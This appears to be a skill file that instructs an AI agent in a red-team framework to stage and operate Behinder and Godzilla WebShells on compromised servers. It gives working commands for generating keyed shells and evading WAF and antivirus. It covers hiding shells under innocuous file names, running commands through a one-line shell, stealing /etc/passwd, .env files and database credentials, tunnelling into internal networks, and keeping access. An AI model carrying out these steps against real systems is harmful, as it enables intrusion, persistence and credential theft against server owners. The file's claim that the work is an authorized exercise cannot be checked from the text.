---
name: webshell-toolkit
description: [Access] Starting and using Behinder / Godzilla / AntSword to upload and manage WebShells, maintain access, and operate the target server
whenToUse: When an upload point/file write/command execution is obtained and a WebShell must be staged and operated
role: exploit
category: Access
tags: [webshell, behinder, godzilla]
enabled: true
---

# WebShell Toolkit (already in place)

Directory `$DSH_HOME/redteam/toolkit/`; Java 25 is installed.

## Iron rule: what gets staged must be a Behinder shell / Godzilla shell (encrypted shell)

**The user will connect to this entry point directly with the Behinder/Godzilla client from the console**, therefore:
- **By default stage only the encrypted shells of Behinder or Godzilla**, and persist `shell_type` + `pass_key` (`redteam_webshell_add`).
- **A one-line shell (`?cmd=`)/ self-written shell / memory shell does not count as a deliverable**: the user cannot connect to it and cannot operate interactively. It may only serve as a **temporary relay** (for example, only to deliver the real shell or to build a tunnel), and the note must state "temporary relay, not a delivered entry point".
- Godzilla GUI generation requires a human present; **prefer the "generate a Behinder shell without a GUI" method below**, which produces a deliverable shell in one command.

## After internet-facing RCE: WebShell first

When files can be written/uploaded, **stage an encrypted WebShell first**, then build the tunnel; it is reusable, the user can connect directly, and it is the delivered entry point. Decision order:

```text
RCE → target directory writable/uploadable → Behinder or Godzilla encrypted shell → verify the user can connect → tunnel
    → not writable / WAF blocks upload → on Linux write an SSH key; otherwise reverse shell
    → cannot egress → OOB verification + other paths
```

- Do not turn the RCE into a half-finished job just to push a shell; if the upload fails, record the reason and fall back to an SSH key / reverse shell.
- After upload you must actually connect once with the **user-side client** (not just look at HTTP 200), then persist with `redteam_webshell_add`.
- Keep only one stable entry point per target; register extra shells with `redteam_cleanup`.

## Generating a Behinder shell without a GUI (recommended, scriptable)

A Behinder shell simply writes the key into a template: key = `md5(connection password)[:16]`. Templates ship with the repository:
`$DSH_HOME/redteam/toolkit/Behinder/server/{shell.jsp,shell.jspx,shell_java9.jsp,shell.php,shell.aspx,shell.ashx,shell.asp}`

```bash
TK=$DSH_HOME/redteam/toolkit
PASS='Rt@2026#xz'                       # connection password (randomly generated, do not use rebeyond)
KEY=$(printf '%s' "$PASS" | md5sum | cut -c1-16)   # Behinder requires the first 16 chars of the 32-char md5
# JSP: replace the key in the template
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.jsp > /tmp/rt-shell.jsp
# PHP: same idea (template variable name is $key)
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.php > /tmp/rt-shell.php
echo "connection password $PASS | key $KEY"      # both must be written into runs/ and redteam_webshell_add
```

- The default key `e45e329feb5d925b` = `md5("rebeyond")[:16]` (that is what the template comment means) — **you must change it to your own password**; using the default password is handing the shell to the defenders.
- When the target has a WAF/antivirus, use the unicode-escaped variant `shell_uni.jsp`: the key is also in escaped form and must be replaced character by character as `\\u00xx` (can be generated with python).
- Verified: all seven templates `shell.jsp / shell.jspx / shell_java9.jsp / shell.php / shell.aspx / shell.ashx / shell.asp` can have their keys swapped with the single `sed` command above.

Godzilla shell (when a GUI is needed):
```bash
DISPLAY=:10.0 java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar
# Manage → Generate: payload java/jsp, encryptor Java_AES_BASE64, random password and key → upload after generation
```

## After upload you must verify "the user can connect"
1. `curl -s -o /dev/null -w '%{http_code}' "https://target/upload/x.jsp"` → expect 200 (**do not test with a GET carrying a cmd parameter**; Behinder/Godzilla shells do not respond to plaintext commands).
2. Create a new connection in the Behinder or Godzilla GUI (URL + connection password) and click "Test connection" → only a successful test counts; once connected, run `id/whoami` in the virtual terminal.
3. Persistence must be complete: `url`, `shell_type=behinder|godzilla`, `pass_key=connection password`, `privilege`, `secret_ref` (evidence file); then **immediately build a suo5 tunnel** (skill `suo5-tunnel`).

## Tool overview

| Tool | Startup command | Notes |
|---|---|---|
| Behinder v4.1 | `java -jar $DSH_HOME/redteam/toolkit/Behinder/Behinder.jar` | AES-encrypted traffic, JSP/PHP/ASPX |
| Godzilla v4.0.1 | `java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar` | Fully encrypted payloads for JSP/PHP/ASPX |
| AntSword | `$DSH_HOME/redteam/toolkit/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | On first launch select the source directory `antSword-2.1.16` |
| suo5 tunnel | `./suo5-linux-amd64` | See skill `suo5-tunnel` |

## Typical flow (authorized exercise)
1. **Determine the write point**: upload vulnerability / arbitrary file write / backend plugin upload / template write / database file write (`INTO OUTFILE`).
2. **Generate the payload**: choose JSP/JSPX/PHP/ASPX per the target language (see "Generating a Behinder shell without a GUI" above); generate the password randomly and record it in `runs/`.
3. **Upload and access**: `curl -s "https://target.example.com/upload/x.jsp"` to confirm a 200 return; do not place the shell at an obvious path (such as `/shell.jsp`) — use a random file name in the same style as static assets.
4. **Connection management**: add the URL + password in the tool and test the connection; after success run commands in the "virtual terminal".
5. **Maintain and exploit**:
   - Collect `id/whoami/hostname/uname -a`, system accounts, intranet IPs, routes.
   - **Immediately build a suo5 tunnel into the intranet** (skill `suo5-tunnel`; this is the standard channel for intranet breakout).
   - Grab sensitive files: `/etc/passwd`, configuration, `.env`, source code, database connection strings → save to `runs/`.
6. **Persistence**:
   - `redteam_webshell_add` (url / **shell_type** / **pass_key** / privilege / secret_ref)
   - `redteam_access_add` (host/account/method webshell/privilege/session reference)
   - `redteam_vuln_update` to set the entry vulnerability to `exploited`
   - Put the upload request and shell access request into the `request`/`response` of `redteam_vuln_add`; include `command`/`result` when scoring

## Command execution (only for temporary relays)
If you only need one-shot command execution, prefer the existing RCE or tunnel and skip staging a one-line shell:
```bash
# Example: execute via parameter passing through a temporary one-line shell (delete after use; not a delivered entry point)
curl -s "https://target.example.com/upload/x.jsp?cmd=id"
# Behinder/Godzilla are GUI tools; on the command line a suo5 tunnel + regular tools is less effort
```

## Cautions
- Generated shells may only be uploaded to **the target of this authorized exercise**; clean up as needed afterwards (delete files, restore the original state).
- The tool GUIs need a graphical session (`DISPLAY=:10.0` is available).
- Persist credentials with `redteam_credential_add`: **write the plaintext into `secret_value`** (displayed directly in the panel for reuse), also write the evidence file into `runs/` and reference it in `secret_ref`. The asset database stays local; do not take the database or exported content away.
- The target may have EDR/antivirus: test whether the shell survives first, to avoid repeated staging that triggers alerts; if staging fails, switch language/encoding (JSP→JSPX→PHP) or switch upload point.
